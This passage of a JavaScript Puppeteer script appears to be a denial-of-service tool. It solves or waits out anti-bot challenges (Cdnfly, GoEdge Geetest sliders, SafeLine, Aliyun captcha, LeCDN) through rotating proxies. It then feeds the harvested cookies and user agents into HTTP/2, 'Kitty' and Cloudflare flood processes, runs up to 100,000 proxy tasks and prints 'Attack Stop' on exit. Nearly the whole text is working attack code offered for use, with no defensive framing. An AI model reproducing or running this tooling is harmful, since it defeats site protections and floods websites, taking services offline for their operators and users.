					colored(colors.COLOR_YELLOW, "[!] Fail Bypass Cdnfly Rotate challenge Try again " + targetURL + " - " + browserProxy);
					bypassdone = false;
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			await page.goto(targetURL, {
				waitUntil: "domcontentloaded",
				timeout: 120000
			});
			await sleep(5);
			return;
		}
	}

	if (content.includes("static.geetest.com/v4/gt4.js") && content.includes("GOEDGE")) {
		colored(colors.COLOR_PURPLE, "[+] Found Goedge Geetest Slide challenge " + browserProxy);
		try {
			maxAttempts = 5;
			index = 0;
			while (index < maxAttempts) {
				await sleep(3)
				const bgImageUrl = await page.evaluate(() => {
					const bgElement = document.querySelector('.geetest_bg');
					if (bgElement) {
						const style = bgElement.style.backgroundImage;
						return style.match(/url\("([^"]+)"\)/)?.[1] || null;
					}
					return null;
				});
				
				const sliceBgImageUrl = await page.evaluate(() => {
					const sliceElement = document.querySelector('.geetest_slice_bg');
					if (sliceElement) {
						const style = sliceElement.style.backgroundImage;
						return style.match(/url\("([^"]+)"\)/)?.[1] || null;
					}
					return null;
				});
				if (!bgImageUrl || !sliceBgImageUrl) {
					await page.goto(targetURL, {
						waitUntil: "domcontentloaded",
						timeout: 120000
					});
					bypassdone = false;
					index++;
					continue;
				}
				const bgImagePage = await browser.newPage();
				const bgImageResponse = await bgImagePage.goto(bgImageUrl, {
					waitUntil: 'domcontentloaded',
					timeout: 120000,
				});
				const sliceImagePage = await browser.newPage();
				const sliceImageResponse = await sliceImagePage.goto(sliceBgImageUrl, {
					waitUntil: 'domcontentloaded',
					timeout: 120000,
				});
				const bgbuffer = await bgImageResponse.buffer();
				const slicebuffer = await sliceImageResponse.buffer();
				await bgImagePage.close();
				await sliceImagePage.close();
				data = await GetGoedgeGeetestSlide(bgbuffer, slicebuffer);
				const {
					status,
					distance,
					times
				} = data;
				if (status) {
					colored(colors.COLOR_GREEN, "[-] Successful GetGoedge&Geetest Slide Distance: " + distance + "px | times: " + times + " - " + browserProxy);
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail GetGoedge&Geetest Slide Distance Try again " + browserProxy);
					bypassdone = false;
					index++;
					continue;
				}

				const sliderElement = await page.$('.geetest_btn');
				const sliderBoundingBox = await sliderElement.boundingBox();
				
				if (sliderBoundingBox) {
					const randomOffset = Math.random() * 10 + 10;
					const startX = sliderBoundingBox.x + randomOffset;
					const startY = sliderBoundingBox.y + 20;
					await page.mouse.move(startX, startY);
					await page.mouse.down();
					const totalDistance = distance;
					const steps = 5;
					let currentX = startX;
					let stepDistance = totalDistance / steps;
					for (let i = 0; i < steps; i++) {
						const moveX = currentX + stepDistance;
						await page.mouse.move(moveX, startY + (Math.random() * 2 - 1));
						currentX = moveX;
						await sleep(0.05)
					}
					await page.mouse.up();
					await sleep(3)
				} else {
					bypassdone = false;
					index++;
					continue;
				}

				const content = await page.content();
				if (!content.includes("static.geetest.com/v4/gt4.js") && !content.includes("GOEDGE")) {
					colored(colors.COLOR_GREEN, "[-] Bypass Goedge Geetest Slide challenge " + targetURL + " - " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Bypass Goedge Geetest Slide challenge Try again " + targetURL + " - " + browserProxy);
					bypassdone = false;
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			await page.goto(targetURL, {
				waitUntil: "domcontentloaded",
				timeout: 120000
			});
			await sleep(5);
			return;
		}
	}

	if (content.includes("/_guard/html.js?js=slider_html")) {
		const currentURL = await page.url();
		const parsedURL = new URL(currentURL);
		const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
		await page.goto(`${baseURL}/_guard/slide.png`, {
			waitUntil: "domcontentloaded",
			timeout: 120000
		});
		const newslidecookies = await page.cookies();
		const isnewslide = newslidecookies.find(cookie => cookie.name === 'guarddata');
		if (isnewslide) {
			await CdnflyNewSlide()
			return;
		} else {
			await page.goto(targetURL, {
				waitUntil: "domcontentloaded",
				timeout: 120000
			});

			await CdnflySlide()
			return;
		}
	}

	async function CdnflyNewSlide() { 
		colored(colors.COLOR_PURPLE, "[+] Found Cdnfly NewSlide challenge " + browserProxy);
		try {
			maxAttempts = 5;
			index = 0;
			while (index < maxAttempts) {
				const currentURL = await page.url();
				const parsedURL = new URL(currentURL);
				const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
				const timestamp = new Date().valueOf();
				const slideImageUrl = `${baseURL}/_guard/slide.png?t=${timestamp}`;
				const viewSource = await page.goto(slideImageUrl, {
					waitUntil: "domcontentloaded",
					timeout: 120000
				});
				await sleep(1);
				const buffer = await viewSource.buffer();
				const newslidecookies = await page.cookies();
				const guard = newslidecookies.find(cookie => cookie.name === 'guard');
				const guardword = newslidecookies.find(cookie => cookie.name === 'guardword');
				Slidedata = await GetCdnflyNewSlide(buffer, guard.value, guardword.value);
				const {
					status,
					guardret,
					times
				} = Slidedata;
				if (status) {
					colored(colors.COLOR_GREEN, "[-] Successful CdnflyNewSlide guardret: " + guardret + " | times: " + times + " - " + browserProxy);
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Cdnfly NewSlide Try again " + browserProxy);
					bypassdone = false;
					index++;
					continue;
				}

				await page.setCookie({
					name: 'guardret',
					value: guardret,
					domain: new URL(currentURL).hostname
				});

				await page.goto(targetURL, {
					waitUntil: "domcontentloaded",
					timeout: 120000
				});

				const content = await page.content();
				if (!content.includes("/_guard/html.js?js=slider_html")) {
					colored(colors.COLOR_GREEN, "[-] Bypass Cdnfly NewSlide challenge " + targetURL + " - " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Bypass Cdnfly NewSlide challenge Try again " + targetURL + " - " + browserProxy);
					bypassdone = false;
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			await page.goto(targetURL, {
				waitUntil: "domcontentloaded",
				timeout: 120000
			});
			await sleep(5);
			return;
		}
	}

	async function CdnflySlide() {
		colored(colors.COLOR_PURPLE, "[+] Found Cdnfly Slide challenge " + browserProxy);
		try {
			maxAttempts = 5;
			index = 0;
			while (index < maxAttempts) {
				await page.waitForSelector('#slider', {
					visible: true,
					timeout: 30000
				});
				await sleep(1)
				const sliderElement = await page.$('#slider');
				const sliderBoundingBox = await sliderElement.boundingBox();
				await sliderElement.click();
				const randomOffset = Math.random() * 10 + 10;
				await page.mouse.move(sliderBoundingBox.x + randomOffset, sliderBoundingBox.y + 20);
				await page.mouse.down();
				for (let i = 0; i < 20; i++) {
					await page.mouse.move(sliderBoundingBox.x + (i * sliderBoundingBox.width / 20), sliderBoundingBox.y + 20);
				}
				await page.mouse.up();
				await sleep(Math.random() * 5 + 3);
				const content = await page.content();
				if (content.includes("/_guard/html.js?js=slider_html") === false) {
					colored(colors.COLOR_GREEN, "[-] Bypass Cdnfly Slide challenge " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Bypass Cdnfly Slide challenge Try again " + browserProxy);
					bypassdone = false;
					await page.goto(targetURL, {
						waitUntil: "domcontentloaded",
						timeout: 120000
					});
				}
				if (content.includes("/_guard/html.js") === false) {
					break;
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			await sleep(5);
			return;
		}
	}

	if (content.includes("SafeLineChallenge") === true && content.includes('level: "1"') === true) {
		colored(colors.COLOR_PURPLE, "[+] Found SafeLine JS challenge " + browserProxy);
		try {
			maxAttempts = 3;
			index = 0;
			while (index < maxAttempts) {
				await sleep(8);
				const content = await page.content();
				if (content.includes("SafeLineChallenge") === false & content.includes('level: "1"') === false) {
					colored(colors.COLOR_GREEN, "[-] Bypass SafeLine JS challenge " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Bypass SafeLine JS challenge Try again " + browserProxy);
					bypassdone = false;
					await page.goto(targetURL, {
						waitUntil: "domcontentloaded",
						timeout: 120000
					});
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			return;
		}
	}

	if (content.includes("SafeLineWaitingRoom") === true) {
		colored(colors.COLOR_PURPLE, "[+] Found SafeLine WaitingRoom challenge " + browserProxy);
		try {
			maxAttempts = 50;
			index = 0;
			while (index < maxAttempts) {
				await sleep(10);
				const content = await page.content();
				if (content.includes("SafeLineWaitingRoom") === false) {
					colored(colors.COLOR_GREEN, "[-] Bypass SafeLine WaitingRoom challenge " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, "[~] Wait Bypass SafeLine WaitingRoom challenge again " + browserProxy);
					bypassdone = false;
					await page.goto(targetURL, {
						waitUntil: "domcontentloaded",
						timeout: 120000
					});
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			return;
		}
	}

	if (content.includes("aliyunCaptcha") === true) {
		colored(colors.COLOR_PURPLE, "[+] Found Aliyun Slide challenge " + browserProxy);
		try {
			maxAttempts = 10;
			index = 0;

			while (index < maxAttempts) {
				await page.waitForSelector('#aliyunCaptcha-sliding-slider', {
					visible: true,
					timeout: 30000
				});
				await sleep(2);
				const sliderElement = await page.$('#aliyunCaptcha-sliding-slider');
				const sliderBoundingBox = await sliderElement.boundingBox();
				const startX = sliderBoundingBox.x + 12;
				const startY = sliderBoundingBox.y + 20;
				const endX = sliderBoundingBox.x + 380;
				const endY = startY;
				await page.mouse.move(startX, startY);
				await page.mouse.down();
				await page.mouse.move(endX, endY);
				await page.mouse.up();
				await sleep(3)
				const content = await page.content();
				if (content.includes("aliyunCaptcha") === false) {
					colored(colors.COLOR_GREEN, "[-] Bypass Aliyun Slide challenge " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, "[~] Wait Bypass Aliyun Slide challenge again " + browserProxy);
					bypassdone = false;
					await page.goto(targetURL, {
						waitUntil: "domcontentloaded",
						timeout: 120000
					});
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			return;
		}
	}

	const _v01 = await page.$('.slideBox');
	if (_v01) {
		colored(colors.COLOR_PURPLE, "[+] Found LeCDN Slider challenge " + browserProxy);
		try {
			maxAttempts = 3;
			index = 0;
			while (index < maxAttempts) {
				await page.waitForSelector('#slider', {
					visible: true,
					timeout: 30000
				});
				const $_FSR = await page.$('#slider');
				const $_GDI = await $_FSR.boundingBox();
				const endX = $_GDI.x + 330;
				await page.mouse.move($_GDI.x, $_GDI.y);
				await page.mouse.down();
				await page.mouse.move(endX, $_GDI.y);
				await page.mouse.up();
				await sleep(3)
				const $_ADO = await page.$('.slideBox');
				if (!$_ADO) {
					colored(colors.COLOR_GREEN, "[-] Bypass LeCDN Slider challenge " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Bypass LeCDN Slider challenge Try again " + browserProxy);
					bypassdone = false;
					await page.goto(targetURL, {
						waitUntil: "domcontentloaded",
						timeout: 120000
					});
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			return;
		}
	}

	const _v13 = await page.$('.ui-input')
	if (_v13) {
		colored(colors.COLOR_PURPLE, "[+] Found GoEdge Slider challenge " + browserProxy);
		try {
			maxAttempts = 3;
			index = 0;
			while (index < maxAttempts) {
				await page.waitForSelector('.ui-input', {
					visible: true,
					timeout: 30000
				});
				const $_303 = await page.$('.ui-input');
				const $_932 = await $_303.boundingBox();
				await $_303.click();
				const $_017 = await page.$('.ui-handler');
				await $_017.hover();
				await page.mouse.down();
				for (let i = 0; i < 20; i++) {
					await page.mouse.move($_932.x + (i * $_932.width / 20), $_932.y);
					await sleep(Math.random() * 0.1 + 0.05);
				}
				await page.mouse.up();
				await sleep(3)
				const $_005 = await page.$('.ui-input')
				if ($_005 === false) {
					colored(colors.COLOR_GREEN, "[-] Bypass GoEdge Slider challenge " + browserProxy);
					bypassdone = true;
					break;
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			return;
		}
	}

	const _v32 = await page.$('.ui-checkbox')
	if (_v32) {
		colored(colors.COLOR_PURPLE, "[+] Found GoEdge Click challenge " + browserProxy);
		try {
			maxAttempts = 3;
			index = 0;
			while (index < maxAttempts) {
				await page.waitForSelector('.ui-checkbox', {
					visible: true,
					timeout: 30000
				});
				await page.click('.ui-checkbox');
				await sleep(3)
				const $_99 = await page.$('.ui-checkbox')
				if ($_99) {
					colored(colors.COLOR_GREEN, "[-] Bypass GoEdge Click challenge " + browserProxy);
					bypassdone = true;
					break;
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			return;
		}
	}

	colored(colors.COLOR_PURPLE, "[+] No challenge detected or JS/delay challenge wait for 10s - " + browserProxy);
	await sleep(10);
	bypassdone = true;
	return;
}


async function openBrowser(targetURL, browserProxy, done) {
	const promise = async (resolve, reject) => {
		const [proxyHost, proxyPort] = browserProxy.split(":");

		let page, browser;
		
		const options = {
			headless: false,
			turnstile: true,
			//customConfig: {chromePath: "/root/unzip_202412072023_ungoogled-chromium_131/ungoogled-chromium_131.0.6778.85-1_linux/chrome"},
			disableXvfb: false,
			args: [
				"--ignore-certificate-errors",
				"--window-size=1600,900",
			],
			proxy: {
				host: proxyHost,
				port: proxyPort
			},
			defaultViewport: null
		};

		try {
			({ page, browser } = await connect(options));
			await page.setViewport({
				width: 1920,
				height: 1080,
			});
		} catch (err) {
			colored(colors.COLOR_YELLOW, "[-] Error browser " + browserProxy);
			if (browser) browser.close();
			throw err;
		}

		try {
			colored(colors.COLOR_YELLOW, "[+] Started browser " + browserProxy);
			const client = page._client();
			page.on("framenavigated", (frame) => {
				if (frame.url().includes("challenges.cloudflare.com")) {
					client.send("Target.detachFromTarget", {
						targetId: frame._id
					});
				}
			});

			page.setDefaultNavigationTimeout(60 * 1000);

			const userAgent = await page.evaluate(function() {
				return navigator.userAgent;
			});
			
            let statusCode = null;
            const response = await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 10000 });
            statusCode = response.status();

            page.on('response', async (response) => {
            if (response.url() === targetURL) {
                const updatedStatusCode = response.status();
                if (updatedStatusCode !== statusCode) {
                statusCode = updatedStatusCode;
                }
            }
            });

			await detectChallenge(browserProxy, page, browser, targetURL, reject);

			const pageTitle = await page.title();
			const cookies = await page.cookies(targetURL);

			resolve({
				title: pageTitle,
				browserProxy: browserProxy,
				cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
				userAgent: userAgent,
				content: await page.content(),
				statusCode: statusCode
			});
            
		} catch (exception) {done(exception); throw exception;} finally {
			colored(colors.COLOR_YELLOW, "[-] Closed browser " + browserProxy);
			await browser.close();
		}
	};

	return new Promise(promise);
}


async function startThread(targetURL, browserProxy, task, done, retries = 0) {
	if (retries === COOKIES_MAX_RETRIES) {
		const currentTask = queue.length();
		done(null, {
			task,
			currentTask
		});
	} else {
		try {
			const response = await openBrowser(targetURL, browserProxy, done);
			const statusCode = response.statusCode;
			if (statusCode) {
				statusCodeStats[statusCode] = (statusCodeStats[statusCode] || 0) + 1;
			}

			if (bypassdone === true) {
				challengeCount++;
				const cookies = `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┣Title: ${response.title}
┣Proxy: ${response.browserProxy}
┣User Agent: ${response.userAgent}
┣Cookie: ${response.cookies}
┣Status Code: ${statusCode}
┣Challenges solved: ${challengeCount}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
				colored(colors.COLOR_CYAN, "[+] Challenge solved" + floodMode + ' ' + rebypassMode);
				colored(colors.COLOR_CYAN, cookies);

				if (isFlood === 'on') {
					if (kittyKey) {
						colored(colors.COLOR_CYAN, "[+] Use Kitty Flood");
						await spawnKittyProcess(targetURL, response.userAgent, duration, response.cookies, "GET", rates, response.browserProxy, kittyKey);
					} else if (usehttp2) {
						colored(colors.COLOR_CYAN, "[+] Use http2 Flood");
						await spawnHttp2Process(targetURL, response.userAgent, duration, response.cookies, "GET", rates, response.browserProxy);
					} else if (iscloudflare || usecloudflaremode) {
						colored(colors.COLOR_CYAN, "[+] Use CloudFlare Flood");
						await cloudflareflooder(targetURL, response.userAgent, duration, response.cookies, "GET", rates, response.browserProxy);
					} else {
						await spawnHttp2Process(targetURL, response.userAgent, duration, response.cookies, "GET", rates, response.browserProxy);
					}
				}
				

				if (isRebypass === 'on') {
					colored(colors.COLOR_CYAN, "[-] Flood end rebypass " + response.browserProxy);
					await startThread(targetURL, browserProxy, task, done);
				}
				colored(colors.COLOR_CYAN, "[-] Flood end " + response.browserProxy);
				await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
			} else {
				colored(colors.COLOR_RED, "[!] Fail to solve challenge " + response.browserProxy + " - Status Code: " + statusCode + " - Cookies: " + response.cookies + " | Try again..");
				await startThread(targetURL, response.browserProxy, task, done);
			}
		} catch (exception) {
			done(exception);
			await startThread(targetURL, browserProxy, task, done);
		}
	}
}

function GetAllStatusCodeStats() {
	if (Object.keys(statusCodeStats).length === 0) {
		return;
	}
	let stats = Object.entries(statusCodeStats)
		.map(([code, count]) => `[${code}]x${count}`)
		.join(" ");
	colored(colors.COLOR_CYAN, `- StatusCode: ${stats}`);
}

var queue = async.queue(function(task, done) {
	startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function __main__() {
	const queueDrainHandler = () => {};
	queue.drain(queueDrainHandler);
	for (let i = 0; i < 100000; i++) {
		const browserProxy = randList(proxies);
		proxies.remove(browserProxy);
		queue.unshift({
			browserProxy: browserProxy
		});
		if (proxies.length == 0) {
			readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
			proxies = readLines(proxyFile);
		}
	}
}

process.on('exit', async () => {
	GetAllStatusCodeStats();
	await killChrome();
});

process.on('SIGINT', async () => {
	console.log("—————————————Attack Stop—————————————");
	killChrome();
	process.exit();
});

process.on('SIGTERM', async () => {
	console.log("—————————————Attack Stop—————————————");
	killChrome();
	process.exit();
});

function killChrome() {
	exec('pkill -u $USER chrome', (error, stdout, stderr) => {
	});

    exec('pkill -u $USER http2', (error, stdout, stderr) => {
	});

    exec('pkill -u $USER kittys', (error, stdout, stderr) => {
	});

    exec('pkill -u $USER http1', (error, stdout, stderr) => {
	});

	exec('pkill -u $USER Xvfb', (error, stdout, stderr) => {
	});
}
__main__();
setTimeout(function() {
	process.exit();
}, process.argv[7] * 1000);
